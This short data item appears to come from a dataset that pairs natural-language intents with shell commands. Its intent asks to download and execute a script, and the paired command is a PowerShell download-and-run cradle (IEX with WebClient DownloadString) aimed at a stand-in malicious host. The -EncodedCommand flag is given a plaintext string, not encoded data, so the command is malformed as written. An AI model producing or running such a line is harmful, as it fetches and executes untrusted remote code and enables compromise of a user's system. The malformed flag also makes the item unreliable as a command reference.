# Natural language intent:
# Download and execute a script with encoded PowerShell command from a specified URL.

powershell.exe -EncodedCommand "IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')"
